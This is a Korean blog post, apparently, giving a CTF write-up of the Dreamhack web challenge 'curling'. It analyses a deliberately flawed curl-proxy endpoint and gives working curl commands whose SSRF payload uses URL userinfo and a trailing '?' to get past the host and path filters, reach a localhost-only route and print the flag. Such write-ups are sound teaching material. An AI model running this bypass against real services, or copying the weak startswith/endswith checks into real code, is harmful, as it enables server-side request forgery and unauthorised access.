@@ -1,0 +1,125 @@
+---
+title: "curling (dreamhack)"
+date: "2026-10-17"
+category: "ctf"
+subcategory: "web"
+description: "simple api server"
+---
+______________________________
+
+## Challenge Analysis
+이번 문제의 제목은 curling입니다.  
+따라서 curl을 이용해서 푸는 문제일꺼라 유추를 해볼 수 있어요.  
+이제 소스 코드를 봐볼께요.
+
+______________________________
+
+## source code analyze
+
+```python
+
+ALLOWED_HOSTS = ['dreamhack.io', 'tools.dreamhack.io']
+
+# 해당 endpoint는 POST만 받고 있어요.
+@app.route("/api/v1/test/curl", methods=["POST"])
+def admin():
+    url = request.form["url"].strip()
+    # **ALLOWED_HOSTS** 리스트에 있는 host인지 확인해요.
+    for host in ALLOWED_HOSTS:
+        if url.startswith('http://' + host):
+            break
+
+        return {'result': False, 'msg': 'Not Allowed host'}
+    # 클라이언트가 입력한 url의 path가 "**/test/internal**"로 끝난다면 필터링해요.
+    if url.endswith('/test/internal'):
+        return {'result': False, 'msg': 'Not Allowed endpoint'}
+
+    try:
+        response = run(
+            # 필터링을 모두 통과 했다면 클라이언트가 입력한 url을 **curl** 명령어로 실행해요.
+            ["curl", f"{url}"], capture_output=True, text=True, timeout=1
+        )
+        # 위 코드의 결과를 반환해요.
+        return {'result': True, 'msg': response.stdout}
+
+    except TimeoutExpired:
+        return {'result': False, 'msg': 'Timeout'}
+```
+
+
+```python
+
+@app.route('/api/v1/test/internal', methods=["GET"])
+def test():
+    ip = request.remote_addr
+    # ip가 localhost가 아니라면 필터링 해요.
+    if not ip == '127.0.0.1':
+        return {'result': False, 'msg': 'Only local access is allowed'}
+    # 모든 필터링을 우회 하면 FLAG를 반환해요.
+    return {'result': True, 'msg': FLAG}
+```
+______________________________
+
+결국 flag를 얻기 위해 구상 할 url의 구조는 다음과 같아요.
+>  1. url에 ALLOWED_HOSTS가 들어가야한다.
+>  2. **test/internal**의 문자열 필터링을 우회 해야한다.
+>  3. 동시에 서버가 localhost으로 인식해야한다.
+
+위 세 조건을 동시에 만족하는 Payload를 짜려면 url의 구조를 알아야해요.
+```
+
+scheme://username:password@host:port/path?query
+```
+**username:password** 부분을 합쳐서 userinfo. 즉, 자격증명이라고 불러요.  
+사용자 이름과 pw가 평문으로 url에 보이기 때문에 요즘은 잘 사용하지 않아요.  
+
+이 문제의 필터링 코드는 자격증명 부분을 읽기만 하고 실제 요청은  
+curl이 host:port로 보내요.
+
+이 특성을 이용하면 **userinfo**에는 ALLOWED_HOSTS를, **host:port**에는 127.0.0.1:8000을 넣어서  
+1, 3번의 조건을 동시에 만족 시킬 수 있어요.
+
+
+______________________________
+
+## Payload
+
+문제를 풀 떄 BurpSuite를 사용해도 되지만 문제 제목이 curling이니 curl 명령어로 풀어볼께요.  
+
+**1. url에 ALLOWED_HOSTS가 들어가야한다.**    
+이 필터링을 우회 하기 위해 페이로드는 다음과 같이 시작할께요.
+```
+
+// input
+curl -X POST "http://host3.dreamhack.games:14738/api/v1/test/curl" \
+--data-urlencode "url=http://dreamhack.io"
+
+// output
+msg":"Timeout","result":false
+```
+return된 msg가 **'msg': 'Not Allowed host**이 아닌 걸 보면  
+해당 필터링은 통과했다고 볼 수 있어요.
+
+______________________________
+
+**2. **test/internal**의 문자열 필터링을 우회 해야한다.**  
+해당 필터링 코드를 보면, endswith 함수를 사용해 path의 문자열 자체를 검사하기 때문에  
+path 끝에 쿼리스트링("?")을 붙여주면 우회할 수 있어요.
+
+______________________________
+
+**3. 동시에 서버가 localhost으로 인식해야한다.**
+```
+
+// input
+curl -X POST "http://host3.dreamhack.games:14738/api/v1/test/curl" \
+--data-urlencode "url=http://dreamhack.io@127.0.0.1:8000/api/v1/test/internal?"
+
+//output
+{"msg":"{\"msg\":\"DH{S5Rf_1s_funNy:m+5XabDLV1A+YJAnmEOrFA==}\",\"result\":true}\n","result":true}
+```
+
+
+
+
+
